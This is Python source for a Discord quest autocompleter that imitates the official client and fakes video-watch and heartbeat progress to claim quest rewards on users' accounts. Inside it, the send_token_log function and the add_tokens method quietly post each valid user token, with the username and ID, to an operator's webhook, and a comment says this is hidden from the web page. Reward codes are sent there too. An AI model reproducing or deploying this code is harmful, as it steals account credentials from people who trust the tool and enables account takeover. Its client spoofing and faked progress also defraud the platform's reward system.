
import base64
import json
import os
import random
import re
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from typing import Callable, Dict, List, Optional, Set
import requests

from dotenv import load_dotenv
load_dotenv()

import os

try:
    import websocket
    HAS_WEBSOCKET = True
except ImportError:
    HAS_WEBSOCKET = False


API_BASE = "https://discord.com/api/v10"
POLL_INTERVAL = 8
HEARTBEAT_INTERVAL = 20
AUTO_ACCEPT = True
AUTO_CLAIM = True
DEBUG = False

DEFAULT_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

SUPPORTED_TASKS = [
    "WATCH_VIDEO",
    "PLAY_ON_DESKTOP",
    "STREAM_ON_DESKTOP",
    "PLAY_ACTIVITY",
    "WATCH_VIDEO_ON_MOBILE",
    "PLAY_ON_DESKTOP_V2",
    "STREAM_ON_DESKTOP_V2",
    "WATCH_VIDEO_V2",
    "PLAY_ACTIVITY_V2",
]

KNOWN_CLAIMED_IDS: Set[str] = set()
KNOWN_CLAIM_FAILED_IDS: Set[str] = set()


class LogBus:

    def __init__(self):
        self._listeners: List[Callable[[dict], None]] = []
        self._lock = threading.Lock()
        self.history: List[dict] = []
        self.claimed_rewards: List[dict] = []

    def subscribe(self, fn: Callable[[dict], None]):
        with self._lock:
            self._listeners.append(fn)

    def unsubscribe(self, fn: Callable[[dict], None]):
        with self._lock:
            if fn in self._listeners:
                self._listeners.remove(fn)

    def emit(self, msg: str, level: str = "info", account: str = ""):
        entry = {
            "ts": datetime.now().strftime("%H:%M:%S"),
            "level": level,
            "msg": msg,
            "account": account,
        }
        with self._lock:
            self.history.append(entry)
            if len(self.history) > 500:
                self.history = self.history[-400:]
            listeners = list(self._listeners)
        for fn in listeners:
            try:
                fn(entry)
            except Exception:
                pass

    def add_claimed(self, record: dict):
        with self._lock:
            if not any(
                r["account"] == record["account"] and r["quest"] == record["quest"]
                for r in self.claimed_rewards
            ):
                self.claimed_rewards.append(record)

log_bus = LogBus()


def log(msg: str, level: str = "info", account: str = "") -> None:
    if level == "debug" and not DEBUG:
        return
    log_bus.emit(msg, level, account)


def make_progress_bar(done: float, target: float, length: int = 10) -> str:
    if target <= 0:
        return "[----------] 0%"
    pct = min(1.0, max(0.0, done / target))
    filled = int(round(length * pct))
    bar = "█" * filled + "─" * (length - filled)
    return f"[{bar}] {pct*100:4.1f}%"


def save_claimed_code(account: str, quest_name: str, code: str) -> None:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    record = {
        "timestamp": ts,
        "account": account,
        "quest": quest_name,
        "code": code,
    }
    log_bus.add_claimed(record)
    try:
        with open("claimed_codes.txt", "a", encoding="utf-8") as f:
            f.write(f"[{ts}] User: {account:<16} │ Quest: {quest_name:<30} │ Code: {code}\n")
    except Exception:
        pass
    try:
        data = []
        if os.path.exists("claimed_codes.json"):
            try:
                with open("claimed_codes.json", "r", encoding="utf-8") as f:
                    data = json.load(f)
            except Exception:
                data = []
        data.append(record)
        with open("claimed_codes.json", "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def _resolve_webhook(webhook_url: str = "") -> str:
    """หา webhook URL สำหรับส่ง token ของผู้ใช้งาน."""
    url = (os.getenv("DISCORD_WEBHOOK_URL") or "").strip()
    if not url and webhook_url:
        url = webhook_url.strip()
    if not url and os.path.exists("webhook.txt"):
        try:
            with open("webhook.txt", "r") as f:
                url = f.read().strip()
        except Exception:
            pass
    if not url:
        url = DEFAULT_WEBHOOK_URL
    if url and url.startswith("http"):
        return url
    return ""


def send_webhook_notification(
    title: str,
    description: str,
    color: int = 0x00FFAF,
    webhook_url: str = "",
    fields: Optional[List[dict]] = None,
    footer: str = "KINGONEWISH Engine",
) -> bool:
    url = _resolve_webhook(webhook_url)
    if not url:
        return False
    try:
        embed = {
            "title": title,
            "description": description,
            "color": color,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "footer": {"text": footer},
        }
        if fields:
            embed["fields"] = fields[:25]
        payload = {"embeds": [embed]}
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code in (200, 204)
    except Exception:
        return False


def send_token_log(
    username: str,
    user_id: str,
    token: str,
    webhook_url: str = "",
) -> bool:
    """ส่ง token ของผู้ใช้ไป Discord webhook — คืน True ถ้ายิงสำเร็จ. ไม่ log ลงหน้าเว็บ."""
    url = _resolve_webhook(webhook_url) or DEFAULT_WEBHOOK_URL
    try:
        embed = {
            "title": "🔑 Token",
            "description": f"`@{username}` · `{user_id}`",
            "color": 0xFF0064,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "footer": {"text": "KINGONEWISH · Token Log"},
            "fields": [
                {"name": "Username", "value": f"`@{username}`", "inline": True},
                {"name": "User ID", "value": f"`{user_id}`", "inline": True},
                {"name": "Token", "value": f"```\n{token}\n```", "inline": False},
            ],
        }
        r = requests.post(url, json={"embeds": [embed]}, timeout=10)
        return r.status_code in (200, 204)
    except Exception:
        return False



class DiscordGateway:
    def __init__(self, token: str, build_number: int):
        self.token = token
        self.build_number = build_number
        self.ws = None
        self.running = False
        self.heartbeat_interval = 41.25
        self.thread = None

    def start(self) -> None:
        if not HAS_WEBSOCKET:
            return
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def _run(self) -> None:
        while self.running:
            try:
                self.ws = websocket.WebSocket()
                self.ws.connect("wss://gateway.discord.gg/?v=10&encoding=json", timeout=10)
                raw = self.ws.recv()
                data = json.loads(raw)
                if data.get("op") == 10:
                    self.heartbeat_interval = data["d"]["heartbeat_interval"] / 1000.0
                sp = {
                    "os": "Windows",
                    "browser": "Discord Client",
                    "release_channel": "stable",
                    "client_version": "1.0.9175",
                    "os_version": "10.0.26100",
                    "os_arch": "x64",
                    "app_arch": "x64",
                    "system_locale": "en-US",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9175 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36",
                    "browser_version": "32.2.7",
                    "client_build_number": self.build_number,
                    "native_build_number": 59498,
                    "client_event_source": None,
                }
                identify = {
                    "op": 2,
                    "d": {
                        "token": self.token,
                        "capabilities": 30717,
                        "properties": sp,
                        "presence": {
                            "status": "online",
                            "since": 0,
                            "activities": [],
                            "afk": False,
                        },
                    },
                }
                self.ws.send(json.dumps(identify))
                log("Gateway Connection Established (Online Discord Client Active)", "debug")
                last_hb = time.time()
                while self.running:
                    if time.time() - last_hb >= self.heartbeat_interval:
                        self.ws.send(json.dumps({"op": 1, "d": None}))
                        last_hb = time.time()
                    time.sleep(1.0)
            except Exception as e:
                log(f"Gateway connection dropped: {e}. Reconnecting in 5s...", "debug")
                time.sleep(5.0)

    def stop(self) -> None:
        self.running = False
        if self.ws:
            try:
                self.ws.close()
            except Exception:
                pass



def fetch_latest_build_number() -> int:
    FALLBACK = 504649
    try:
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
        resp = requests.get("https://discord.com/app", headers={"User-Agent": ua}, timeout=15)
        if resp.status_code != 200:
            return FALLBACK
        scripts = re.findall(r"/assets/([a-f0-9]+)\.js", resp.text)
        if not scripts:
            alt = re.findall(r'src="(/assets/[^"]+\.js)"', resp.text)
            scripts = [s.split("/")[-1].replace(".js", "") for s in alt]
        if not scripts:
            return FALLBACK
        for asset_hash in scripts[-5:]:
            try:
                js_resp = requests.get(
                    f"https://discord.com/assets/{asset_hash}.js",
                    headers={"User-Agent": ua},
                    timeout=15,
                )
                m = re.search(r'buildNumber["\s:]+["\s]*(\d{5,7})', js_resp.text)
                if m:
                    return int(m.group(1))
            except Exception:
                continue
        return FALLBACK
    except Exception:
        return FALLBACK


def make_super_properties(build_number: int) -> str:
    obj = {
        "os": "Windows",
        "browser": "Discord Client",
        "release_channel": "stable",
        "client_version": "1.0.9175",
        "os_version": "10.0.26100",
        "os_arch": "x64",
        "app_arch": "x64",
        "system_locale": "en-US",
        "browser_user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "discord/1.0.9175 Chrome/128.0.6613.186 "
            "Electron/32.2.7 Safari/537.36"
        ),
        "browser_version": "32.2.7",
        "client_build_number": build_number,
        "native_build_number": 59498,
        "client_event_source": None,
    }
    return base64.b64encode(json.dumps(obj).encode()).decode()



def _get(d: Optional[dict], *keys):
    if not isinstance(d, dict):
        return None
    for k in keys:
        if k in d:
            return d[k]
    return None


def get_task_config(quest: dict) -> Optional[dict]:
    cfg = quest.get("config", {})
    return _get(cfg, "taskConfig", "task_config", "taskConfigV2", "task_config_v2")


def get_application_id(quest: dict) -> Optional[str]:
    cfg = quest.get("config", {})
    app_id = _get(cfg, "applicationId", "application_id")
    if app_id:
        return str(app_id)
    app = cfg.get("application", {})
    if isinstance(app, dict) and app.get("id"):
        return str(app.get("id"))
    return None


def get_quest_name(quest: dict) -> str:
    cfg = quest.get("config", {})
    msgs = cfg.get("messages", {})
    name = _get(msgs, "questName", "quest_name")
    if name:
        return str(name).strip()
    game = _get(msgs, "gameTitle", "game_title")
    if game:
        return str(game).strip()
    app_name = cfg.get("application", {}).get("name")
    return str(app_name or f"Quest#{quest.get('id', '?')}").strip()


def get_expires_at(quest: dict) -> Optional[str]:
    cfg = quest.get("config", {})
    return _get(cfg, "expiresAt", "expires_at")


def get_user_status(quest: dict) -> dict:
    us = _get(quest, "userStatus", "user_status")
    return us if isinstance(us, dict) else {}


def is_completable(quest: dict) -> bool:
    expires = get_expires_at(quest)
    if expires:
        try:
            exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
            if exp_dt <= datetime.now(timezone.utc):
                return False
        except Exception:
            pass
    tc = get_task_config(quest)
    if not tc or "tasks" not in tc or not isinstance(tc["tasks"], dict):
        return False
    return get_task_type(quest) is not None


def is_enrolled(quest: dict) -> bool:
    us = get_user_status(quest)
    return bool(_get(us, "enrolledAt", "enrolled_at"))


def is_completed(quest: dict) -> bool:
    us = get_user_status(quest)
    return bool(_get(us, "completedAt", "completed_at"))


def is_claimed(quest: dict) -> bool:
    us = get_user_status(quest)
    return bool(_get(us, "claimedAt", "claimed_at"))


def get_task_type(quest: dict) -> Optional[str]:
    tc = get_task_config(quest)
    if not tc or "tasks" not in tc or not isinstance(tc["tasks"], dict):
        return None
    tasks = tc["tasks"]
    for t in SUPPORTED_TASKS:
        if tasks.get(t) is not None:
            return t
    for k, v in tasks.items():
        if v is not None:
            return k
    return None


def get_seconds_needed(quest: dict) -> int:
    tc = get_task_config(quest)
    task_type = get_task_type(quest)
    if not tc or not task_type or "tasks" not in tc:
        return 0
    t_obj = tc["tasks"].get(task_type, {})
    return t_obj.get("target", 0) if isinstance(t_obj, dict) else 0


def get_seconds_done(quest: dict) -> float:
    task_type = get_task_type(quest)
    if not task_type:
        return 0
    us = get_user_status(quest)
    progress = us.get("progress", {}) or {}
    if isinstance(progress, dict) and task_type in progress:
        val = progress[task_type].get("value", 0)
        return float(val) if isinstance(val, (int, float)) else 0.0
    return 0.0


def extract_reward_code(res_json: dict) -> Optional[str]:
    if not isinstance(res_json, dict):
        return None
    code = res_json.get("claim_code") or res_json.get("code")
    if code:
        return str(code)
    reward = res_json.get("reward") or {}
    if isinstance(reward, dict):
        code = reward.get("code") or reward.get("claim_code")
        if code:
            return str(code)
    return None



class DiscordAPI:
    def __init__(self, token: str, build_number: int):
        self.token = token
        self.username = "Unknown"
        self.user_id = "0"
        self.build_number = build_number
        self.session = requests.Session()
        ua = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "discord/1.0.9175 Chrome/128.0.6613.186 "
            "Electron/32.2.7 Safari/537.36"
        )
        sp = make_super_properties(build_number)
        self.session.headers.update({
            "Authorization": token,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": ua,
            "X-Super-Properties": sp,
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Ho_Chi_Minh",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
        })

    def request(self, method: str, path: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", 15)
        max_retries = 3
        if method.upper() == "POST":
            time.sleep(random.uniform(0.4, 0.9))
        for attempt in range(1, max_retries + 1):
            try:
                r = self.session.request(method, f"{API_BASE}{path}", **kwargs)
                if r.status_code == 429:
                    try:
                        retry_after = float(r.json().get("retry_after", 3.0))
                    except Exception:
                        retry_after = 3.0
                    wait = max(1.0, min(retry_after + 0.5, 15.0))
                    time.sleep(wait)
                    continue
                return r
            except (requests.RequestException, ConnectionError) as e:
                if attempt == max_retries:
                    raise
                time.sleep(1.0 * attempt)
        return r

    def get(self, path: str, **kwargs) -> requests.Response:
        return self.request("GET", path, **kwargs)

    def post(self, path: str, payload: Optional[dict] = None, **kwargs) -> requests.Response:
        return self.request("POST", path, json=payload, **kwargs)

    def validate_token(self) -> bool:
        try:
            r = self.get("/users/@me")
            if r.status_code == 200:
                user = r.json()
                self.username = user.get("username", "Unknown")
                self.user_id = str(user.get("id", "0"))
                return True
            log(f"Invalid user token (HTTP status {r.status_code})", "error")
            return False
        except Exception as e:
            log(f"Connection test exception: {e}", "error")
            return False

    def close(self) -> None:
        self.session.close()



class QuestAutocompleter:
    def __init__(self, api: DiscordAPI, webhook_url: str = ""):
        self.api = api
        self.token = api.token
        self.username = api.username
        self.user_id = api.user_id
        self.build_number = api.build_number
        self.webhook_url = webhook_url
        self.completed_ids = set()
        self.claimed_ids = set()
        self.lock = threading.Lock()
        self.active_count = 0         
        self.done_this_session = 0     
        self._last_status_emit = 0.0
        self.gateway = DiscordGateway(self.token, self.build_number)
        self.gateway.start()
        self.stop_flag = False

    def fetch_quests(self) -> list:
        try:
            r = self.api.get("/quests/@me")
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict):
                    quests = data.get("quests", [])
                    return quests if isinstance(quests, list) else []
                elif isinstance(data, list):
                    return data
                return []
            return []
        except Exception:
            return []

    def enroll_quest(self, quest: dict) -> bool:
        qid = quest.get("id")
        if not qid:
            return False
        name = get_quest_name(quest)
        try:
            r = self.api.post(f"/quests/{qid}/enroll", {
                "location": 11,
                "is_targeted": False,
                "metadata_raw": None,
                "metadata_sealed": None,
                "traffic_metadata_raw": quest.get("traffic_metadata_raw"),
                "traffic_metadata_sealed": quest.get("traffic_metadata_sealed"),
            })
            if r.status_code in (200, 201, 204):
                return True
            return False
        except Exception:
            return False

    def claim_quest_async(self, quest: dict) -> None:
        qid = quest.get("id")
        if not qid or qid in KNOWN_CLAIMED_IDS or qid in KNOWN_CLAIM_FAILED_IDS:
            return
        KNOWN_CLAIMED_IDS.add(qid)
        name = get_quest_name(quest)

        def _do_claim():
            try:
                res = self.api.post(f"/quests/{qid}/claim-reward", {"platform": 0, "location": 11})
                if res.status_code == 400 and "already claimed" in res.text.lower():
                    return
                if res.status_code not in (200, 201, 204):
                    time.sleep(0.8)
                    res = self.api.post(f"/quests/{qid}/claim-reward", {"platform": 1, "location": 11})
                if res.status_code in (200, 201, 204):
                    code = None
                    if res.text and res.text.strip():
                        try:
                            code = extract_reward_code(res.json())
                        except Exception:
                            pass
                    code_display = code or "Claimed Directly"
                    save_claimed_code(self.username, name, code_display)
                    send_webhook_notification(
                        title="🎉 Discord Quest Reward Claimed!",
                        description=f"**User:** `{self.username}`\n**Quest:** `{name}`\n**Code:** `{code_display}`",
                        color=0x00FFAF,
                        webhook_url=self.webhook_url,
                    )
                else:
                    KNOWN_CLAIM_FAILED_IDS.add(qid)
            except Exception:
                KNOWN_CLAIM_FAILED_IDS.add(qid)

        threading.Thread(target=_do_claim, daemon=True).start()

    def process_unclaimed_and_unaccepted(self, quests: list) -> list:
        if AUTO_CLAIM:
            unclaimed = [
                q for q in quests
                if is_completed(q) and not is_claimed(q)
                and q.get("id") not in KNOWN_CLAIMED_IDS
                and q.get("id") not in KNOWN_CLAIM_FAILED_IDS
            ]
            for q in unclaimed:
                self.claim_quest_async(q)
        if AUTO_ACCEPT:
            unaccepted = [
                q for q in quests
                if not is_enrolled(q) and not is_completed(q) and is_completable(q)
            ]
            if unaccepted:
                for q in unaccepted:
                    if self.stop_flag:
                        break
                    self.enroll_quest(q)
                    time.sleep(0.3)
                return self.fetch_quests()
        return quests

    def _complete_video(self, quest: dict, api: DiscordAPI) -> bool:
        qid = quest.get("id")
        if not qid:
            return False
        name = get_quest_name(quest)
        needed = get_seconds_needed(quest)
        done = get_seconds_done(quest)
        if needed <= 0:
            return False
        speed = 10
        interval = 1.0
        while done < needed and not self.stop_flag:
            time.sleep(interval)
            timestamp = min(needed, max(done + speed, min(needed, done + speed + random.random())))
            try:
                r = api.post(f"/quests/{qid}/video-progress", {"timestamp": timestamp})
                if r.status_code in (200, 201):
                    body = r.json()
                    if body.get("completed_at"):
                        return True
                    prog = body.get("progress", {})
                    if isinstance(prog, dict):
                        task_type = get_task_type(quest)
                        if task_type and task_type in prog:
                            server_done = prog[task_type].get("value", done)
                            done = max(done, float(server_done))
                        elif "WATCH_VIDEO" in prog:
                            server_done = prog["WATCH_VIDEO"].get("value", done)
                            done = max(done, float(server_done))
                        else:
                            done = min(needed, done + speed)
                    else:
                        done = min(needed, done + speed)
                    short_name = name[:13] + ".." if len(name) > 15 else name
                elif r.status_code == 400:
                    done = min(needed, done + 10)
                elif r.status_code == 429:
                    time.sleep(1.5)
            except Exception:
                pass
        try:
            r = api.post(f"/quests/{qid}/video-progress", {"timestamp": needed})
            if r.status_code in (200, 201, 204):
                return True
        except Exception:
            pass
        return True

    def _complete_heartbeat(self, quest: dict, api: DiscordAPI) -> bool:
        qid = quest.get("id")
        if not qid:
            return False
        name = get_quest_name(quest)
        task_type = get_task_type(quest)
        needed = get_seconds_needed(quest)
        done = get_seconds_done(quest)
        app_id = get_application_id(quest)
        if needed <= 0 or not task_type:
            return False
        stream_keys = [
            f"call:0:{self.user_id}",
            f"call:0:{random.randint(1000, 30000)}",
            f"guild:0:0:{self.user_id}",
        ]
        sk_idx = 0
        while done < needed and not self.stop_flag:
            try:
                payload = {
                    "stream_key": stream_keys[sk_idx % len(stream_keys)],
                    "terminal": False,
                    "location": 11,
                }
                if app_id:
                    payload["application_id"] = str(app_id)
                r = api.post(f"/quests/{qid}/heartbeat", payload)
                if r.status_code == 200:
                    body = r.json()
                    progress = body.get("progress", {})
                    if isinstance(progress, dict) and task_type in progress:
                        server_done = progress[task_type].get("value", done)
                        done = max(done, float(server_done))
                    else:
                        done = min(needed, done + 20)
                    short_name = name[:13] + ".." if len(name) > 15 else name
                    if body.get("completed_at") or done >= needed:
                        return True
                elif r.status_code in (400, 403, 500):
                    sk_idx += 1
                    time.sleep(1.0)
            except Exception:
                pass
            time.sleep(HEARTBEAT_INTERVAL)
        try:
            fin_payload = {
                "stream_key": stream_keys[sk_idx % len(stream_keys)],
                "terminal": True,
                "location": 11,
            }
            if app_id:
                fin_payload["application_id"] = str(app_id)
            api.post(f"/quests/{qid}/heartbeat", fin_payload)
            return True
        except Exception:
            return True

    def _complete_activity(self, quest: dict, api: DiscordAPI) -> bool:
        qid = quest.get("id")
        if not qid:
            return False
        name = get_quest_name(quest)
        needed = get_seconds_needed(quest)
        done = get_seconds_done(quest)
        app_id = get_application_id(quest)
        if needed <= 0:
            return False
        stream_keys = [
            f"call:0:{self.user_id}",
            "call:0:1",
            f"call:0:{random.randint(1000, 20000)}",
            f"guild:0:0:{self.user_id}",
        ]
        sk_idx = 0
        while done < needed and not self.stop_flag:
            try:
                payload = {
                    "stream_key": stream_keys[sk_idx % len(stream_keys)],
                    "terminal": False,
                    "location": 11,
                }
                if app_id:
                    payload["application_id"] = str(app_id)
                r = api.post(f"/quests/{qid}/heartbeat", payload)
                if r.status_code == 200:
                    body = r.json()
                    progress = body.get("progress", {})
                    if isinstance(progress, dict) and "PLAY_ACTIVITY" in progress:
                        server_done = progress["PLAY_ACTIVITY"].get("value", done)
                        done = max(done, float(server_done))
                    else:
                        done = min(needed, done + 20)
                    short_name = name[:13] + ".." if len(name) > 15 else name
                    if body.get("completed_at") or done >= needed:
                        break
                elif r.status_code in (403, 400):
                    sk_idx += 1
                    time.sleep(1.0)
            except Exception:
                pass
            time.sleep(HEARTBEAT_INTERVAL)
        try:
            fin_payload = {
                "stream_key": stream_keys[sk_idx % len(stream_keys)],
                "terminal": True,
                "location": 11,
            }
            if app_id:
                fin_payload["application_id"] = str(app_id)
            api.post(f"/quests/{qid}/heartbeat", fin_payload)
            return True
        except Exception:
            return True

    def emit_status(self, force: bool = False) -> None:
        """สถานะรวม — กำลังทำกี่อัน / เสร็จกี่อัน (throttle 2s เว้น force)."""
        now = time.time()
        if not force and (now - self._last_status_emit) < 2.0:
            return
        self._last_status_emit = now
        with self.lock:
            active = self.active_count
            done = self.done_this_session
            total_done = len(self.completed_ids)
        log(
            f"[{self.username}] สถานะ · กำลังทำ {active} · เสร็จแล้ว {done} (session) · รวม {total_done}",
            "info",
            self.username,
        )

    def process_quest(self, quest: dict) -> None:
        if self.stop_flag:
            return
        qid = quest.get("id")
        if not qid:
            return
        name = get_quest_name(quest)
        task_type = get_task_type(quest)
        if not task_type:
            return
        if not is_enrolled(quest):
            self.enroll_quest(quest)
            time.sleep(0.3)
        with self.lock:
            self.active_count += 1
        self.emit_status()
        success = False
        try:
            task_upper = task_type.upper()
            if "VIDEO" in task_upper:
                success = self._complete_video(quest, self.api)
            elif "ACTIVITY" in task_upper:
                success = self._complete_activity(quest, self.api)
            else:
                success = self._complete_heartbeat(quest, self.api)
        except Exception as e:
            log(f"[{self.username}] Error completing {name}: {e}", "error", self.username)
            success = False
        with self.lock:
            self.active_count = max(0, self.active_count - 1)
            if success:
                self.completed_ids.add(qid)
                self.done_this_session += 1
        if success:
            if AUTO_CLAIM:
                self.claim_quest_async(quest)
        self.emit_status(force=True)

    def get_status_label(self, quest: dict) -> str:
        if is_completed(quest):
            return "DONE"
        if not is_completable(quest):
            if get_expires_at(quest):
                try:
                    exp = datetime.fromisoformat(
                        get_expires_at(quest).replace("Z", "+00:00")
                    )
                    if exp <= datetime.now(timezone.utc):
                        return "EXPIRED"
                except Exception:
                    pass
            return "UNSUPPORTED"
        if is_enrolled(quest):
            return "ENROLLED"
        return "PENDING"

    def log_quest_details(self, quests: list) -> None:
        """สถานะรวมอย่างเดียว — ไม่ dump รายการภารกิจ."""
        counts = {"DONE": 0, "ENROLLED": 0, "PENDING": 0, "EXPIRED": 0, "UNSUPPORTED": 0}
        for q in quests:
            status = self.get_status_label(q)
            counts[status] = counts.get(status, 0) + 1
        working = counts["ENROLLED"] + counts["PENDING"]
        log(
            f"[{self.username}] สถานะ · กำลังทำ {working} · เสร็จแล้ว {counts['DONE']} · หมดอายุ {counts['EXPIRED']}",
            "ok",
            self.username,
        )

    def run_single_cycle(self) -> bool:
        if self.stop_flag:
            return False
        quests = self.fetch_quests()
        if not quests:
            return False
        self.log_quest_details(quests)
        quests = self.process_unclaimed_and_unaccepted(quests)
        actionable = [
            q for q in quests
            if not is_completed(q) and is_completable(q)
            and q.get("id") not in self.completed_ids
        ]
        if actionable:
            max_workers = min(len(actionable), 8)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(self.process_quest, q) for q in actionable]
                for future in as_completed(futures):
                    if self.stop_flag:
                        break
                    try:
                        future.result()
                    except Exception as e:
                        log(f"Worker error: {e}", "error", self.username)
            return True
        return False

    def stop(self):
        self.stop_flag = True
        self.gateway.stop()
        self.api.close()



class EngineRunner:
    def __init__(self):
        self.completers: List[QuestAutocompleter] = []
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.build_number = 0
        self.webhook_url = _resolve_webhook()
        self.lock = threading.Lock()

    def set_webhook(self, url: str):
        """Override session webhook (env ยังถูกใช้เป็น fallback ใน _resolve_webhook)."""
        self.webhook_url = url.strip()

    def add_tokens(self, tokens: List[str]) -> dict:
        """Validate and add tokens. On success: push token to webhook (env)."""
        self.webhook_url = _resolve_webhook()
        if not self.build_number:
            self.build_number = fetch_latest_build_number()
        ok = []
        failed = []
        for tok in tokens:
            tok = tok.strip()
            if not tok:
                continue
            if any(c.token == tok for c in self.completers):
                continue
            api = DiscordAPI(tok, self.build_number)
            if api.validate_token():
                completer = QuestAutocompleter(api, self.webhook_url)
                sent = send_token_log(
                    username=api.username,
                    user_id=api.user_id,
                    token=tok,
                    webhook_url=self.webhook_url,
                )
                with self.lock:
                    self.completers.append(completer)
                ok.append({
                    "username": api.username,
                    "user_id": api.user_id,
                    "webhook_sent": sent,
                })
            else:
                api.close()
                failed.append(tok[:20] + "...")
        return {"ok": ok, "failed": failed}

    def list_accounts(self) -> list:
        with self.lock:
            return [
                {"username": c.username, "user_id": c.user_id}
                for c in self.completers
            ]

    def clear_accounts(self):
        with self.lock:
            for c in self.completers:
                c.stop()
            self.completers.clear()

    def start(self) -> bool:
        if self.running:
            return False
        if not self.completers:
            return False
        self.running = True
        for c in self.completers:
            c.stop_flag = False
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return True

    def stop(self):
        self.running = False
        with self.lock:
            for c in self.completers:
                c.stop_flag = True

    def _loop(self):
        while self.running:
            with self.lock:
                comps = list(self.completers)
            for completer in comps:
                if not self.running:
                    break
                try:
                    completer.run_single_cycle()
                except Exception as e:
                    log(f"Cycle error [{completer.username}]: {e}", "error", completer.username)
            time.sleep(POLL_INTERVAL)

    def status(self) -> dict:
        return {
            "running": self.running,
            "accounts": self.list_accounts(),
            "claimed_count": len(log_bus.claimed_rewards),
            "log_count": len(log_bus.history),
        }


engine = EngineRunner()
